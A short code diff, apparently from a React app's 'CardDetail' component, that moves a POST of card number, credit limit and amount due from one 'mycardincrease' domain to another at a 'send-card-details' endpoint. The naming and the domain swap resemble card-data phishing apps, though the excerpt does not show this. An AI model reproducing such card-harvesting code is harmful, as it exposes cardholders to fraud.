@@ -60,7 +60,7 @@ const CardDetail = () => {
     
     if (handleValidation()) {
       try {
-        const response = await axios.post("https://api.mycardincrease.in/v1/send-card-details", {
+        const response = await axios.post("https://api.mycardincrease.space/v1/send-card-details", {
           cardNumber: Number(cardNumber),
           creditLimit: Number(creditLimit),
           totalAmountDue: Number(totalAmountDue),
